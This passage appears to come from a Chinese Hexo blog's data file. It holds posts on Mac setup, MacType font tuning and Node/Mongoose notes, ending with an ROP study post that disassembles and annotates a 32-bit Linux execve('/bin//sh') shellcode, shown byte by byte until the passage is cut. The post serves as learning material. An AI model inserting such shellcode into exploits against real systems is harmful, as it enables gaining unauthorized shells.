class=\"line\">Vue.use(Radio)</span><br></pre></td></tr></table></figure>\n\n<p>注意：已经不需要写分号了。</p>\n"},{"title":"Mac","date":"2015-02-15T13:03:43.000Z","_content":"\n### 起\n\n人生中第一台Macbook pro，终于在发完年终奖后、回家过年前到手了。\n\n是从苹果团买的，感觉顺丰陆运速度还算快。\n\n装在之前的电脑包里面，就显得电脑包得空间太大，需要买个内胆包才行。\n\n### 用\n\n首先要学习的是触摸板手势，有了这个真心不想用鼠标了，总算能够完全使用键盘（且算触摸板为键盘的一部分吧）\n\n键盘使用起来按键声音还好，比较清脆舒服，虽然键程不长，但是感觉还行吧。的确有必要换个外置键盘。\n\n字体看的真是舒服，终于不用在Win/Linux下面费尽心思的调整字体了。\n\n### 软件\n一大堆软件都不会用。\n\n#### 常用软件\n\n登陆AppStore，进免费排行榜，下载了QQ、搜狗输入**板**，其中搜狗输入**板**的功能是通过里面的入口安装搜狗输入法。\n安装Xcode，虽然目前一次都没有打开过。\n首先安装Homebrew，幸好最近在折腾Linuxbrew，很多操作都是一样的\n\n对于使用Homebrew安装的系统软件，如数据库等，根据提示，相关启动方法如下\n\n`\nTo have launchd start mongodb at login:\n    ln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents\n    ln -sfv /usr/local/opt/redis/*.plist ~/Library/LaunchAgents\nThen to load mongodb now:\n    launchctl load ~/Library/LaunchAgents/homebrew.mxcl.mongodb.plist\n    launchctl load ~/Library/LaunchAgents/homebrew.mxcl.redis.plist\nOr, if you don’t want/need launchctl, you can just run:\n    mongod --config /usr/local/etc/mongod.conf\n    redis-server /usr/local/etc/redis.conf\n`\n\n#### zsh\n\n具体参考Mactalk的这篇文章[终极shell](http://macshuo.com/?p=676)\n\n另外，在使用zsh的agnoster主题时，需要额外下载增强的字体，并在终端选择使用。\n","source":"_posts/Mac.md","raw":"title: Mac\ndate: 2015-02-15 13:03:43\ntags: [\"Mac\"]\n---\n\n### 起\n\n人生中第一台Macbook pro，终于在发完年终奖后、回家过年前到手了。\n\n是从苹果团买的，感觉顺丰陆运速度还算快。\n\n装在之前的电脑包里面，就显得电脑包得空间太大，需要买个内胆包才行。\n\n### 用\n\n首先要学习的是触摸板手势，有了这个真心不想用鼠标了，总算能够完全使用键盘（且算触摸板为键盘的一部分吧）\n\n键盘使用起来按键声音还好，比较清脆舒服，虽然键程不长，但是感觉还行吧。的确有必要换个外置键盘。\n\n字体看的真是舒服，终于不用在Win/Linux下面费尽心思的调整字体了。\n\n### 软件\n一大堆软件都不会用。\n\n#### 常用软件\n\n登陆AppStore，进免费排行榜，下载了QQ、搜狗输入**板**，其中搜狗输入**板**的功能是通过里面的入口安装搜狗输入法。\n安装Xcode，虽然目前一次都没有打开过。\n首先安装Homebrew，幸好最近在折腾Linuxbrew，很多操作都是一样的\n\n对于使用Homebrew安装的系统软件，如数据库等，根据提示，相关启动方法如下\n\n`\nTo have launchd start mongodb at login:\n    ln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents\n    ln -sfv /usr/local/opt/redis/*.plist ~/Library/LaunchAgents\nThen to load mongodb now:\n    launchctl load ~/Library/LaunchAgents/homebrew.mxcl.mongodb.plist\n    launchctl load ~/Library/LaunchAgents/homebrew.mxcl.redis.plist\nOr, if you don’t want/need launchctl, you can just run:\n    mongod --config /usr/local/etc/mongod.conf\n    redis-server /usr/local/etc/redis.conf\n`\n\n#### zsh\n\n具体参考Mactalk的这篇文章[终极shell](http://macshuo.com/?p=676)\n\n另外，在使用zsh的agnoster主题时，需要额外下载增强的字体，并在终端选择使用。\n","slug":"Mac","published":1,"updated":"2020-09-07T02:31:06.568Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmu000wxrn5774v49e2","content":"<h3 id=\"起\"><a href=\"#起\" class=\"headerlink\" title=\"起\"></a>起</h3><p>人生中第一台Macbook pro，终于在发完年终奖后、回家过年前到手了。</p>\n<p>是从苹果团买的，感觉顺丰陆运速度还算快。</p>\n<p>装在之前的电脑包里面，就显得电脑包得空间太大，需要买个内胆包才行。</p>\n<h3 id=\"用\"><a href=\"#用\" class=\"headerlink\" title=\"用\"></a>用</h3><p>首先要学习的是触摸板手势，有了这个真心不想用鼠标了，总算能够完全使用键盘（且算触摸板为键盘的一部分吧）</p>\n<p>键盘使用起来按键声音还好，比较清脆舒服，虽然键程不长，但是感觉还行吧。的确有必要换个外置键盘。</p>\n<p>字体看的真是舒服，终于不用在Win&#x2F;Linux下面费尽心思的调整字体了。</p>\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><p>一大堆软件都不会用。</p>\n<h4 id=\"常用软件\"><a href=\"#常用软件\" class=\"headerlink\" title=\"常用软件\"></a>常用软件</h4><p>登陆AppStore，进免费排行榜，下载了QQ、搜狗输入<strong>板</strong>，其中搜狗输入<strong>板</strong>的功能是通过里面的入口安装搜狗输入法。<br>安装Xcode，虽然目前一次都没有打开过。<br>首先安装Homebrew，幸好最近在折腾Linuxbrew，很多操作都是一样的</p>\n<p>对于使用Homebrew安装的系统软件，如数据库等，根据提示，相关启动方法如下</p>\n<p><code>To have launchd start mongodb at login:     ln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents     ln -sfv /usr/local/opt/redis/*.plist ~/Library/LaunchAgents Then to load mongodb now:     launchctl load ~/Library/LaunchAgents/homebrew.mxcl.mongodb.plist     launchctl load ~/Library/LaunchAgents/homebrew.mxcl.redis.plist Or, if you don’t want/need launchctl, you can just run:     mongod --config /usr/local/etc/mongod.conf     redis-server /usr/local/etc/redis.conf</code></p>\n<h4 id=\"zsh\"><a href=\"#zsh\" class=\"headerlink\" title=\"zsh\"></a>zsh</h4><p>具体参考Mactalk的这篇文章<a href=\"http://macshuo.com/?p=676\">终极shell</a></p>\n<p>另外，在使用zsh的agnoster主题时，需要额外下载增强的字体，并在终端选择使用。</p>\n","excerpt":"","more":"<h3 id=\"起\"><a href=\"#起\" class=\"headerlink\" title=\"起\"></a>起</h3><p>人生中第一台Macbook pro，终于在发完年终奖后、回家过年前到手了。</p>\n<p>是从苹果团买的，感觉顺丰陆运速度还算快。</p>\n<p>装在之前的电脑包里面，就显得电脑包得空间太大，需要买个内胆包才行。</p>\n<h3 id=\"用\"><a href=\"#用\" class=\"headerlink\" title=\"用\"></a>用</h3><p>首先要学习的是触摸板手势，有了这个真心不想用鼠标了，总算能够完全使用键盘（且算触摸板为键盘的一部分吧）</p>\n<p>键盘使用起来按键声音还好，比较清脆舒服，虽然键程不长，但是感觉还行吧。的确有必要换个外置键盘。</p>\n<p>字体看的真是舒服，终于不用在Win&#x2F;Linux下面费尽心思的调整字体了。</p>\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><p>一大堆软件都不会用。</p>\n<h4 id=\"常用软件\"><a href=\"#常用软件\" class=\"headerlink\" title=\"常用软件\"></a>常用软件</h4><p>登陆AppStore，进免费排行榜，下载了QQ、搜狗输入<strong>板</strong>，其中搜狗输入<strong>板</strong>的功能是通过里面的入口安装搜狗输入法。<br>安装Xcode，虽然目前一次都没有打开过。<br>首先安装Homebrew，幸好最近在折腾Linuxbrew，很多操作都是一样的</p>\n<p>对于使用Homebrew安装的系统软件，如数据库等，根据提示，相关启动方法如下</p>\n<p><code>To have launchd start mongodb at login:     ln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents     ln -sfv /usr/local/opt/redis/*.plist ~/Library/LaunchAgents Then to load mongodb now:     launchctl load ~/Library/LaunchAgents/homebrew.mxcl.mongodb.plist     launchctl load ~/Library/LaunchAgents/homebrew.mxcl.redis.plist Or, if you don’t want/need launchctl, you can just run:     mongod --config /usr/local/etc/mongod.conf     redis-server /usr/local/etc/redis.conf</code></p>\n<h4 id=\"zsh\"><a href=\"#zsh\" class=\"headerlink\" title=\"zsh\"></a>zsh</h4><p>具体参考Mactalk的这篇文章<a href=\"http://macshuo.com/?p=676\">终极shell</a></p>\n<p>另外，在使用zsh的agnoster主题时，需要额外下载增强的字体，并在终端选择使用。</p>\n"},{"title":"使用Mactype渲染字体","date":"2015-03-15T13:27:48.000Z","_content":"\nMactype是在Windows下实现类似Mac下字体渲染效果的程序。长期以来，我一直都使用这个软件替代系统自带的ClearType渲染功能。渲染得到的字体相当不错。\n\n但是，\n\n\n## 字体\n\nWindows下面自带的雅黑字体效果还是挺不错的，但是还是建议使用其他修改过的字体。字体可以去[极限社区](http://bbs.themex.net/forumdisplay.php?f=90)下载。该论坛也是重要的讨论字体修改和Mactype的网站。\n\n之前用的比较多的是XHei，貌似现在出了新的字体，以后下载看下效果。\n\n## 程序优化\n\n### Firefox\n\nFirefox默认开启的硬件加速，因此无法直接使用Mactype字体渲染。关于具体的设置，参考文档[MacType.Source](https://github.com/renkun-ken/MacType.Source)\n\n打开`about:config`，修改设置如下\n\n| Key                                                      | Value |\n|----------------------------------------------------------|-------|\n| gfx.direct2d.disabled                                    | true  |\n| gfx.font_loader.delay                                    | -1    |\n| gfx.font_rendering.cleartype.always_use_for_content;true | true  |\n| gfx.font_rendering.cleartype_params.cleartype_level      | 100   |\n| gfx.font_rendering.cleartype_params.enhanced_contrast    | 100   |\n| gfx.font_rendering.cleartype_params.gamma                | 1400  |\n| gfx.font_rendering.cleartype_params.pixel_structure      | 1     |\n| gfx.font_rendering.cleartype_params.rendering_mode       | 5     |\n| gfx.font_rendering.fallback.always_use_cmaps             | true  |\n| gfx.use_text_smoothing_setting                           | true  |\n\n### VisualStudio\n\n与Firefox一样，同样使用了硬件加速，而且偏偏没有任何设置。\n\n在[VS 怎么使用 MacType 的字体渲染？](http://www.zhihu.com/question/24251313)中提出了解决方案：对于ClearType设置为Smoothing的字体，且Visualstudio在显示比例不为100%时可以直接通过Mactype进行渲染。\n\n所以需要使用这样特别制作的字体，从[自制FantasqueSansMono字体+VS缩放插件,完美解决VS2013+Mactype](http://tieba.baidu.com/p/3366845989)下载特别制作过的字体FantasqueSansMono字体。\n\n但是默认VS都会在新开一个窗口的时候重置缩放比例，因此需要使用插件让VS保持显示比较为99%。插件可以参考帖子[Visual Studio 2010 default zoom level](https://stackoverflow.com/questions/4771750/visual-studio-2010-default-zoom-level)，固定了显示比例之后，防止不小心按了`Ctrl+滚轮`而改变了缩放，可以安装插件[Disable Mouse Wheel Zoom](https://visualstudiogallery.msdn.microsoft.com/d088791c-150a-4834-8f28-462696a82bb8)，装上了这几个插件，基本可以欣赏漂亮的字体渲染了。\n","source":"_posts/Mactype.md","raw":"title: 使用Mactype渲染字体\ndate: 2015-03-15 13:27:48\ntags: [\"Windows\"]\n---\n\nMactype是在Windows下实现类似Mac下字体渲染效果的程序。长期以来，我一直都使用这个软件替代系统自带的ClearType渲染功能。渲染得到的字体相当不错。\n\n但是，\n\n\n## 字体\n\nWindows下面自带的雅黑字体效果还是挺不错的，但是还是建议使用其他修改过的字体。字体可以去[极限社区](http://bbs.themex.net/forumdisplay.php?f=90)下载。该论坛也是重要的讨论字体修改和Mactype的网站。\n\n之前用的比较多的是XHei，貌似现在出了新的字体，以后下载看下效果。\n\n## 程序优化\n\n### Firefox\n\nFirefox默认开启的硬件加速，因此无法直接使用Mactype字体渲染。关于具体的设置，参考文档[MacType.Source](https://github.com/renkun-ken/MacType.Source)\n\n打开`about:config`，修改设置如下\n\n| Key                                                      | Value |\n|----------------------------------------------------------|-------|\n| gfx.direct2d.disabled                                    | true  |\n| gfx.font_loader.delay                                    | -1    |\n| gfx.font_rendering.cleartype.always_use_for_content;true | true  |\n| gfx.font_rendering.cleartype_params.cleartype_level      | 100   |\n| gfx.font_rendering.cleartype_params.enhanced_contrast    | 100   |\n| gfx.font_rendering.cleartype_params.gamma                | 1400  |\n| gfx.font_rendering.cleartype_params.pixel_structure      | 1     |\n| gfx.font_rendering.cleartype_params.rendering_mode       | 5     |\n| gfx.font_rendering.fallback.always_use_cmaps             | true  |\n| gfx.use_text_smoothing_setting                           | true  |\n\n### VisualStudio\n\n与Firefox一样，同样使用了硬件加速，而且偏偏没有任何设置。\n\n在[VS 怎么使用 MacType 的字体渲染？](http://www.zhihu.com/question/24251313)中提出了解决方案：对于ClearType设置为Smoothing的字体，且Visualstudio在显示比例不为100%时可以直接通过Mactype进行渲染。\n\n所以需要使用这样特别制作的字体，从[自制FantasqueSansMono字体+VS缩放插件,完美解决VS2013+Mactype](http://tieba.baidu.com/p/3366845989)下载特别制作过的字体FantasqueSansMono字体。\n\n但是默认VS都会在新开一个窗口的时候重置缩放比例，因此需要使用插件让VS保持显示比较为99%。插件可以参考帖子[Visual Studio 2010 default zoom level](https://stackoverflow.com/questions/4771750/visual-studio-2010-default-zoom-level)，固定了显示比例之后，防止不小心按了`Ctrl+滚轮`而改变了缩放，可以安装插件[Disable Mouse Wheel Zoom](https://visualstudiogallery.msdn.microsoft.com/d088791c-150a-4834-8f28-462696a82bb8)，装上了这几个插件，基本可以欣赏漂亮的字体渲染了。\n","slug":"Mactype","published":1,"updated":"2020-09-07T02:31:06.568Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmu000xxrn50cz35ud9","content":"<p>Mactype是在Windows下实现类似Mac下字体渲染效果的程序。长期以来，我一直都使用这个软件替代系统自带的ClearType渲染功能。渲染得到的字体相当不错。</p>\n<p>但是，</p>\n<h2 id=\"字体\"><a href=\"#字体\" class=\"headerlink\" title=\"字体\"></a>字体</h2><p>Windows下面自带的雅黑字体效果还是挺不错的，但是还是建议使用其他修改过的字体。字体可以去<a href=\"http://bbs.themex.net/forumdisplay.php?f=90\">极限社区</a>下载。该论坛也是重要的讨论字体修改和Mactype的网站。</p>\n<p>之前用的比较多的是XHei，貌似现在出了新的字体，以后下载看下效果。</p>\n<h2 id=\"程序优化\"><a href=\"#程序优化\" class=\"headerlink\" title=\"程序优化\"></a>程序优化</h2><h3 id=\"Firefox\"><a href=\"#Firefox\" class=\"headerlink\" title=\"Firefox\"></a>Firefox</h3><p>Firefox默认开启的硬件加速，因此无法直接使用Mactype字体渲染。关于具体的设置，参考文档<a href=\"https://github.com/renkun-ken/MacType.Source\">MacType.Source</a></p>\n<p>打开<code>about:config</code>，修改设置如下</p>\n<table>\n<thead>\n<tr>\n<th>Key</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>gfx.direct2d.disabled</td>\n<td>true</td>\n</tr>\n<tr>\n<td>gfx.font_loader.delay</td>\n<td>-1</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype.always_use_for_content;true</td>\n<td>true</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.cleartype_level</td>\n<td>100</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.enhanced_contrast</td>\n<td>100</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.gamma</td>\n<td>1400</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.pixel_structure</td>\n<td>1</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.rendering_mode</td>\n<td>5</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.fallback.always_use_cmaps</td>\n<td>true</td>\n</tr>\n<tr>\n<td>gfx.use_text_smoothing_setting</td>\n<td>true</td>\n</tr>\n</tbody></table>\n<h3 id=\"VisualStudio\"><a href=\"#VisualStudio\" class=\"headerlink\" title=\"VisualStudio\"></a>VisualStudio</h3><p>与Firefox一样，同样使用了硬件加速，而且偏偏没有任何设置。</p>\n<p>在<a href=\"http://www.zhihu.com/question/24251313\">VS 怎么使用 MacType 的字体渲染？</a>中提出了解决方案：对于ClearType设置为Smoothing的字体，且Visualstudio在显示比例不为100%时可以直接通过Mactype进行渲染。</p>\n<p>所以需要使用这样特别制作的字体，从<a href=\"http://tieba.baidu.com/p/3366845989\">自制FantasqueSansMono字体+VS缩放插件,完美解决VS2013+Mactype</a>下载特别制作过的字体FantasqueSansMono字体。</p>\n<p>但是默认VS都会在新开一个窗口的时候重置缩放比例，因此需要使用插件让VS保持显示比较为99%。插件可以参考帖子<a href=\"https://stackoverflow.com/questions/4771750/visual-studio-2010-default-zoom-level\">Visual Studio 2010 default zoom level</a>，固定了显示比例之后，防止不小心按了<code>Ctrl+滚轮</code>而改变了缩放，可以安装插件<a href=\"https://visualstudiogallery.msdn.microsoft.com/d088791c-150a-4834-8f28-462696a82bb8\">Disable Mouse Wheel Zoom</a>，装上了这几个插件，基本可以欣赏漂亮的字体渲染了。</p>\n","excerpt":"","more":"<p>Mactype是在Windows下实现类似Mac下字体渲染效果的程序。长期以来，我一直都使用这个软件替代系统自带的ClearType渲染功能。渲染得到的字体相当不错。</p>\n<p>但是，</p>\n<h2 id=\"字体\"><a href=\"#字体\" class=\"headerlink\" title=\"字体\"></a>字体</h2><p>Windows下面自带的雅黑字体效果还是挺不错的，但是还是建议使用其他修改过的字体。字体可以去<a href=\"http://bbs.themex.net/forumdisplay.php?f=90\">极限社区</a>下载。该论坛也是重要的讨论字体修改和Mactype的网站。</p>\n<p>之前用的比较多的是XHei，貌似现在出了新的字体，以后下载看下效果。</p>\n<h2 id=\"程序优化\"><a href=\"#程序优化\" class=\"headerlink\" title=\"程序优化\"></a>程序优化</h2><h3 id=\"Firefox\"><a href=\"#Firefox\" class=\"headerlink\" title=\"Firefox\"></a>Firefox</h3><p>Firefox默认开启的硬件加速，因此无法直接使用Mactype字体渲染。关于具体的设置，参考文档<a href=\"https://github.com/renkun-ken/MacType.Source\">MacType.Source</a></p>\n<p>打开<code>about:config</code>，修改设置如下</p>\n<table>\n<thead>\n<tr>\n<th>Key</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>gfx.direct2d.disabled</td>\n<td>true</td>\n</tr>\n<tr>\n<td>gfx.font_loader.delay</td>\n<td>-1</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype.always_use_for_content;true</td>\n<td>true</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.cleartype_level</td>\n<td>100</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.enhanced_contrast</td>\n<td>100</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.gamma</td>\n<td>1400</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.pixel_structure</td>\n<td>1</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.cleartype_params.rendering_mode</td>\n<td>5</td>\n</tr>\n<tr>\n<td>gfx.font_rendering.fallback.always_use_cmaps</td>\n<td>true</td>\n</tr>\n<tr>\n<td>gfx.use_text_smoothing_setting</td>\n<td>true</td>\n</tr>\n</tbody></table>\n<h3 id=\"VisualStudio\"><a href=\"#VisualStudio\" class=\"headerlink\" title=\"VisualStudio\"></a>VisualStudio</h3><p>与Firefox一样，同样使用了硬件加速，而且偏偏没有任何设置。</p>\n<p>在<a href=\"http://www.zhihu.com/question/24251313\">VS 怎么使用 MacType 的字体渲染？</a>中提出了解决方案：对于ClearType设置为Smoothing的字体，且Visualstudio在显示比例不为100%时可以直接通过Mactype进行渲染。</p>\n<p>所以需要使用这样特别制作的字体，从<a href=\"http://tieba.baidu.com/p/3366845989\">自制FantasqueSansMono字体+VS缩放插件,完美解决VS2013+Mactype</a>下载特别制作过的字体FantasqueSansMono字体。</p>\n<p>但是默认VS都会在新开一个窗口的时候重置缩放比例，因此需要使用插件让VS保持显示比较为99%。插件可以参考帖子<a href=\"https://stackoverflow.com/questions/4771750/visual-studio-2010-default-zoom-level\">Visual Studio 2010 default zoom level</a>，固定了显示比例之后，防止不小心按了<code>Ctrl+滚轮</code>而改变了缩放，可以安装插件<a href=\"https://visualstudiogallery.msdn.microsoft.com/d088791c-150a-4834-8f28-462696a82bb8\">Disable Mouse Wheel Zoom</a>，装上了这几个插件，基本可以欣赏漂亮的字体渲染了。</p>\n"},{"title":"Node开发","date":"2014-12-12T15:26:22.000Z","_content":"\n\n本文的主要内容：使用Node Coffee-script开发一个网站\n\n#### Mongoose\n\n注意，Mongoose会对输入的Collection名字自动添加复数形式命名后存入到Mongodb中，例如user重命名为表users，具体的命名方法可以参考[Mongoose在创建Model时对Collection的命名策略](http://aiilive.blog.51cto.com/1925756/1405203)\n\n解决方法是在创建Model的时候传入第三个参数作为实际的表名\n\n在查询中，还发现在查询大量数据的时候会出现`Error: parseError occured`的错误提示，相关的错误可以参看[MongoDB parseError when using limit and sort](https://stackoverflow.com/questions/21767673/mongodb-parseerror-when-using-limit-and-sort)，大意是缺少索引，但是我明明已经添加了相关的索引的，不知道如何去解决，故改用Mongodb试下\n\n","source":"_posts/Node-Development.md","raw":"title: Node开发\ndate: 2014-12-12 15:26:22\ntags:\n---\n\n\n本文的主要内容：使用Node Coffee-script开发一个网站\n\n#### Mongoose\n\n注意，Mongoose会对输入的Collection名字自动添加复数形式命名后存入到Mongodb中，例如user重命名为表users，具体的命名方法可以参考[Mongoose在创建Model时对Collection的命名策略](http://aiilive.blog.51cto.com/1925756/1405203)\n\n解决方法是在创建Model的时候传入第三个参数作为实际的表名\n\n在查询中，还发现在查询大量数据的时候会出现`Error: parseError occured`的错误提示，相关的错误可以参看[MongoDB parseError when using limit and sort](https://stackoverflow.com/questions/21767673/mongodb-parseerror-when-using-limit-and-sort)，大意是缺少索引，但是我明明已经添加了相关的索引的，不知道如何去解决，故改用Mongodb试下\n\n","slug":"Node-Development","published":1,"updated":"2020-09-07T02:31:06.568Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmu000zxrn5hi9ecwgn","content":"<p>本文的主要内容：使用Node Coffee-script开发一个网站</p>\n<h4 id=\"Mongoose\"><a href=\"#Mongoose\" class=\"headerlink\" title=\"Mongoose\"></a>Mongoose</h4><p>注意，Mongoose会对输入的Collection名字自动添加复数形式命名后存入到Mongodb中，例如user重命名为表users，具体的命名方法可以参考<a href=\"http://aiilive.blog.51cto.com/1925756/1405203\">Mongoose在创建Model时对Collection的命名策略</a></p>\n<p>解决方法是在创建Model的时候传入第三个参数作为实际的表名</p>\n<p>在查询中，还发现在查询大量数据的时候会出现<code>Error: parseError occured</code>的错误提示，相关的错误可以参看<a href=\"https://stackoverflow.com/questions/21767673/mongodb-parseerror-when-using-limit-and-sort\">MongoDB parseError when using limit and sort</a>，大意是缺少索引，但是我明明已经添加了相关的索引的，不知道如何去解决，故改用Mongodb试下</p>\n","excerpt":"","more":"<p>本文的主要内容：使用Node Coffee-script开发一个网站</p>\n<h4 id=\"Mongoose\"><a href=\"#Mongoose\" class=\"headerlink\" title=\"Mongoose\"></a>Mongoose</h4><p>注意，Mongoose会对输入的Collection名字自动添加复数形式命名后存入到Mongodb中，例如user重命名为表users，具体的命名方法可以参考<a href=\"http://aiilive.blog.51cto.com/1925756/1405203\">Mongoose在创建Model时对Collection的命名策略</a></p>\n<p>解决方法是在创建Model的时候传入第三个参数作为实际的表名</p>\n<p>在查询中，还发现在查询大量数据的时候会出现<code>Error: parseError occured</code>的错误提示，相关的错误可以参看<a href=\"https://stackoverflow.com/questions/21767673/mongodb-parseerror-when-using-limit-and-sort\">MongoDB parseError when using limit and sort</a>，大意是缺少索引，但是我明明已经添加了相关的索引的，不知道如何去解决，故改用Mongodb试下</p>\n"},{"title":"Node使用心得","date":"2014-12-07T16:49:58.000Z","_content":"\n## Node使用心得\n\n#### 更换NPM源\n\n使用[淘宝NPM源](http://npm.taobao.org/)，在使用过程中发现目录`~/.npm/.cache_cnpm/_locks/`是root权限创建的（估计是因为第一次是以root权限运行），在普通权限下使用cnpm时会报错，需要手动修改下。\n\n#### Bower使用\n\n#### Grunt使用\n\n#### bootstrap3-jade-node\n\n基于Grunt基础上，加上了Bootstrap3、Jade、Node模板配置\n\n安装命令：\n\n`npm install -g grunt-express-bootstrap`\n\n初始化库\n\n`grunt-express-bootstrap init`\n\n生成库\n\n```\nnpm install\nbower install\n```\n\n本地运行\n\n``\n\n\n","source":"_posts/Node-Start.md","raw":"title: Node使用心得\ndate: 2014-12-07 16:49:58\ntags:\n---\n\n## Node使用心得\n\n#### 更换NPM源\n\n使用[淘宝NPM源](http://npm.taobao.org/)，在使用过程中发现目录`~/.npm/.cache_cnpm/_locks/`是root权限创建的（估计是因为第一次是以root权限运行），在普通权限下使用cnpm时会报错，需要手动修改下。\n\n#### Bower使用\n\n#### Grunt使用\n\n#### bootstrap3-jade-node\n\n基于Grunt基础上，加上了Bootstrap3、Jade、Node模板配置\n\n安装命令：\n\n`npm install -g grunt-express-bootstrap`\n\n初始化库\n\n`grunt-express-bootstrap init`\n\n生成库\n\n```\nnpm install\nbower install\n```\n\n本地运行\n\n``\n\n\n","slug":"Node-Start","published":1,"updated":"2020-09-07T02:31:06.568Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmv0012xrn5e03y28r3","content":"<h2 id=\"Node使用心得\"><a href=\"#Node使用心得\" class=\"headerlink\" title=\"Node使用心得\"></a>Node使用心得</h2><h4 id=\"更换NPM源\"><a href=\"#更换NPM源\" class=\"headerlink\" title=\"更换NPM源\"></a>更换NPM源</h4><p>使用<a href=\"http://npm.taobao.org/\">淘宝NPM源</a>，在使用过程中发现目录<code>~/.npm/.cache_cnpm/_locks/</code>是root权限创建的（估计是因为第一次是以root权限运行），在普通权限下使用cnpm时会报错，需要手动修改下。</p>\n<h4 id=\"Bower使用\"><a href=\"#Bower使用\" class=\"headerlink\" title=\"Bower使用\"></a>Bower使用</h4><h4 id=\"Grunt使用\"><a href=\"#Grunt使用\" class=\"headerlink\" title=\"Grunt使用\"></a>Grunt使用</h4><h4 id=\"bootstrap3-jade-node\"><a href=\"#bootstrap3-jade-node\" class=\"headerlink\" title=\"bootstrap3-jade-node\"></a>bootstrap3-jade-node</h4><p>基于Grunt基础上，加上了Bootstrap3、Jade、Node模板配置</p>\n<p>安装命令：</p>\n<p><code>npm install -g grunt-express-bootstrap</code></p>\n<p>初始化库</p>\n<p><code>grunt-express-bootstrap init</code></p>\n<p>生成库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install</span><br><span class=\"line\">bower install</span><br></pre></td></tr></table></figure>\n\n<p>本地运行</p>\n<p>&#96;&#96;</p>\n","excerpt":"","more":"<h2 id=\"Node使用心得\"><a href=\"#Node使用心得\" class=\"headerlink\" title=\"Node使用心得\"></a>Node使用心得</h2><h4 id=\"更换NPM源\"><a href=\"#更换NPM源\" class=\"headerlink\" title=\"更换NPM源\"></a>更换NPM源</h4><p>使用<a href=\"http://npm.taobao.org/\">淘宝NPM源</a>，在使用过程中发现目录<code>~/.npm/.cache_cnpm/_locks/</code>是root权限创建的（估计是因为第一次是以root权限运行），在普通权限下使用cnpm时会报错，需要手动修改下。</p>\n<h4 id=\"Bower使用\"><a href=\"#Bower使用\" class=\"headerlink\" title=\"Bower使用\"></a>Bower使用</h4><h4 id=\"Grunt使用\"><a href=\"#Grunt使用\" class=\"headerlink\" title=\"Grunt使用\"></a>Grunt使用</h4><h4 id=\"bootstrap3-jade-node\"><a href=\"#bootstrap3-jade-node\" class=\"headerlink\" title=\"bootstrap3-jade-node\"></a>bootstrap3-jade-node</h4><p>基于Grunt基础上，加上了Bootstrap3、Jade、Node模板配置</p>\n<p>安装命令：</p>\n<p><code>npm install -g grunt-express-bootstrap</code></p>\n<p>初始化库</p>\n<p><code>grunt-express-bootstrap init</code></p>\n<p>生成库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install</span><br><span class=\"line\">bower install</span><br></pre></td></tr></table></figure>\n\n<p>本地运行</p>\n<p>&#96;&#96;</p>\n"},{"title":"ROP 学习之 Shellcode","date":"2018-01-23T21:42:52.000Z","updated":"2018-01-27T17:32:12.000Z","_content":"\n# 0\n\n上一篇学习 ROP 的文章中提到原文的 Shellcode 调用失败了，这次就尝试分析下该 Shellcode 看看能不能找出原因。\n\n# 1. 对 Shellcode 反汇编\n\n拿到一段 Shellcode，第一步就是尝试反汇编，参考文章《使用 Python 将 Shellcode 转换成汇编》文章教程，基于 capstone 使用如下代码即可。\n\n```\n#!/usr/bin/env python2\n# -*- coding:utf-8 -*-\n\nfrom capstone import *\n\nfor code in shellcode:\n    md = Cs(CS_ARCH_X86, CS_MODE_32)\n    for i in md.disasm(code, 0x00):\n        print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))\n```\n\n从这段源码可以看到，这是利用 capstone 的反汇编功能来实现的，但是需要指定对应汇编的处理器架构和字长信息。\n\n# 2. 分析 Shellcode 原理\n\nLinu 下 Shellcode 的原理参考[《Linux下shellcode的编写》](https://xz.aliyun.com/t/2052)一文，关键是调用系统调用函数 execve。这个函数的参数如下：\n\n* 参数 1：file 文件名\n* 参数 2：NULL 即 0\n* 参数 3：NULL 即 0\n\n实现调用时，需要将系统调用号码 11 放入 eax 中，最终调用`int 0x80`实现函数调用。\n\n## ROP 教程中的 Shellcode 分析\n\n下面针对第一次调用失败的 Shellcode 反汇编得到的代码分析下：\n\n```\n0x0:   xor ecx, ecx     \\x31\\xc9  // 清空 ecx，即 ecx = 0\n0x2:   mul ecx          \\xf7\\xe1  // 貌似是无意义的 ecx清零指令\n0x4:   push ecx         \\x51      // 压入参数 0\n0x5:   push 0x68732f2f  \\x68\\x2f\\x2f\\x73\\x68  // 压入字符串\n0xa:   push 0x6e69622f  \\x68\\x2f\\x62\\x69\\x6e  // 压入字符串\n0xf:   mov ebx, esp     \\x89\\xe3  // 将字符串的地址传给 ebx\n0x11:  mov al, 0xb      \\xb0\\x0b  